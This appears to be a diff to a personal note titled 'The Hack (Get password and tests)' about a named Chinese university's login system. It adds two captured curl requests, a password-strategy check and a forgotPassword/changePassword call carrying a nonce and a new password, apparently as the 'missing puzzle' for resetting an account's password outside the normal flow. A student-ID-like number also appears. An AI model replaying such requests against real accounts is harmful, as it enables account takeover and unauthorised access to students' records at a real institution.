@@ -1,6 +1,6 @@
 ---
 created: 2021-12-22T13:45:58+08:00
-modified: 2021-12-23T22:13:50+08:00
+modified: 2021-12-23T22:23:22+08:00
 ---
 
 # The Hack (Get password and tests)
@@ -24,3 +24,39 @@ https://cas.paas.lixin.edu.cn/cas/login?service=https%3A%2F%2Flxjw.lixin.edu.cn%
 https://security-center.paas.lixin.edu.cn/find-pwd
 
 20039370
+
+missing puzzle for changing password:
+
+curl 'https://personal-security-center.paas.lixin.edu.cn/api/v1/personal/open/passwordStrategy/verify' \
+  -H 'Connection: keep-alive' \
+  -H 'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98", "Google Chrome";v="98"' \
+  -H 'Accept: application/json, text/plain, */*' \
+  -H 'Content-Type: application/json;charset=UTF-8' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'User-Agent: Mozilla/5.0 (X11; CrOS aarch64 14371.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4729.0 Safari/537.36' \
+  -H 'sec-ch-ua-platform: "Chrome OS"' \
+  -H 'Origin: https://security-center.paas.lixin.edu.cn' \
+  -H 'Sec-Fetch-Site: same-site' \
+  -H 'Sec-Fetch-Mode: cors' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Referer: https://security-center.paas.lixin.edu.cn/' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  --data-raw '{"password":"abcdefABC","userId":""}' \
+  --compressed
+
+curl 'https://personal-security-center.paas.lixin.edu.cn/api/v1/personal/open/forgotPassword/changePassword' \
+  -H 'Connection: keep-alive' \
+  -H 'sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="98", "Google Chrome";v="98"' \
+  -H 'Accept: application/json, text/plain, */*' \
+  -H 'Content-Type: application/json;charset=UTF-8' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'User-Agent: Mozilla/5.0 (X11; CrOS aarch64 14371.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4729.0 Safari/537.36' \
+  -H 'sec-ch-ua-platform: "Chrome OS"' \
+  -H 'Origin: https://security-center.paas.lixin.edu.cn' \
+  -H 'Sec-Fetch-Site: same-site' \
+  -H 'Sec-Fetch-Mode: cors' \
+  -H 'Sec-Fetch-Dest: empty' \
+  -H 'Referer: https://security-center.paas.lixin.edu.cn/' \
+  -H 'Accept-Language: en-US,en;q=0.9' \
+  --data-raw '{"confirmPassword":"abc123ABC","newPassword":"abc123ABC","nonce":"YzhhZmZjYzktNWQ3Ny00MGU1LTg0ODgtYTYzZTMzMDZkMjU0XzE2NDAyNjg5MzcyNTY"}' \
+  --compressed
